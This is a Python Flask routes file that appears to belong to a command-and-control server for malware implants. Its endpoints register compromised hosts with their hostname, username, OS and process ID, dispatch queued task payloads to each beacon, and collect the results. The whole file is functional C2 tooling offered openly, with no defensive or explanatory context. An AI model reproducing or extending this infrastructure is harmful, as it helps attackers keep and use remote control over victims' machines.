"""
routes/beacon.py: Endpoints the implant talks to.

  POST /api/beacon/checkin
  GET  /api/beacon/<uuid>/tasks
  POST /api/beacon/<uuid>/result
"""

from flask import Blueprint, request, jsonify
import db

beacon_bp = Blueprint("beacon", __name__, url_prefix="/api/beacon")


def _err(msg, code=400):
    return jsonify({"status": "error", "message": msg}), code


@beacon_bp.route("/checkin", methods=["POST"])
def checkin():
    data = request.get_json(silent=True)
    if not data:
        return _err("expected JSON body")

    missing = [f for f in ["uuid", "hostname", "username", "os", "arch", "pid"] if f not in data]
    if missing:
        return _err(f"missing fields: {missing}")

    is_new = db.upsert_beacon(data)
    tag = "NEW BEACON" if is_new else "CHECKIN"
    print(f"  [{tag}] {data['uuid'][:8]}  {data['username']}@{data['hostname']}  ({data['os']})")

    return jsonify({"status": "ok", "registered": is_new})


@beacon_bp.route("/<beacon_uuid>/tasks", methods=["GET"])
def get_tasks(beacon_uuid):
    if not db.get_beacon(beacon_uuid):
        return _err("unknown beacon", 404)

    tasks = db.get_pending_tasks(beacon_uuid)
    wire  = [{"task_id": t["task_id"], "type": t["type"], "payload": t["payload"]} for t in tasks]

    if wire:
        print(f"  [TASKS] dispatched {len(wire)} task(s) → {beacon_uuid[:8]}")

    return jsonify({"tasks": wire})


@beacon_bp.route("/<beacon_uuid>/result", methods=["POST"])
def submit_result(beacon_uuid):
    if not db.get_beacon(beacon_uuid):
        return _err("unknown beacon", 404)

    data = request.get_json(silent=True)
    if not data or "task_id" not in data:
        return _err("expected JSON body with task_id")

    db.store_result(beacon_uuid, data)
    print(f"  [RESULT] task {data['task_id']}  exit={data.get('exit_code', '?')}  beacon={beacon_uuid[:8]}")

    return jsonify({"status": "ok"})
